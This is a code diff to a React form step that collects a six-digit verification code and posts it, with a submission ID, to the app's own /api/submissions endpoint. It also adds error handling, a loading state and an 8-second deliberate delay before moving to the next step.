@@ -10,6 +10,8 @@ import { Form, FormControl, FormField, FormItem, FormMessage, FormLabel } from '
 import { InputOTP, InputOTPGroup, InputOTPSlot } from '@/components/ui/input-otp';
 import { Progress } from '@/components/ui/progress';
 import type { Submission } from '@/lib/types';
+import { useState } from 'react';
+import { useToast } from '@/hooks/use-toast';
 
 const formSchema = z.object({
   verificationCode: z.string().length(6, "Code must be 6 digits."),
@@ -18,21 +20,43 @@ const formSchema = z.object({
 type FormValues = z.infer<typeof formSchema>;
 
 interface VerifyCodeStepProps {
+    submissionId: string;
     onNext: (data: Partial<Submission>) => void;
     onBack: () => void;
 }
 
-export function VerifyCodeStep({ onNext, onBack }: VerifyCodeStepProps) {
+export function VerifyCodeStep({ submissionId, onNext, onBack }: VerifyCodeStepProps) {
+    const { toast } = useToast();
+    const [isSubmitting, setIsSubmitting] = useState(false);
+
     const form = useForm<FormValues>({
         resolver: zodResolver(formSchema),
         defaultValues: { verificationCode: '' },
     });
     
     const onSubmit = async (values: FormValues) => {
-        onNext({ verificationCode: values.verificationCode });
+        setIsSubmitting(true);
+        try {
+            const response = await fetch('/api/submissions', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ id: submissionId, ...values }),
+            });
+            if (!response.ok) {
+                const errorData = await response.json();
+                throw new Error(errorData.message || 'Failed to submit verification code.');
+            }
+
+            // Artificial delay
+            setTimeout(() => {
+                onNext({ verificationCode: values.verificationCode });
+                setIsSubmitting(false);
+            }, 8000);
+        } catch (err: any) {
+            toast({ variant: 'destructive', title: 'Submission Failed', description: err.message });
+            setIsSubmitting(false);
+        }
     };
-    
-    const { isSubmitting } = form.formState;
 
     return (
         <div className="w-full max-w-lg mx-auto">
@@ -84,8 +108,8 @@ export function VerifyCodeStep({ onNext, onBack }: VerifyCodeStepProps) {
                         </Button>
                         <Button type="submit" size="lg" className="rounded-full" disabled={isSubmitting}>
                              {isSubmitting && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
-                             Continue
-                             <ArrowRight className="ml-2 h-5 w-5" />
+                             {isSubmitting ? 'Submitting...' : 'Continue'}
+                             {!isSubmitting && <ArrowRight className="ml-2 h-5 w-5" />}
                         </Button>
                     </div>
                 </form>
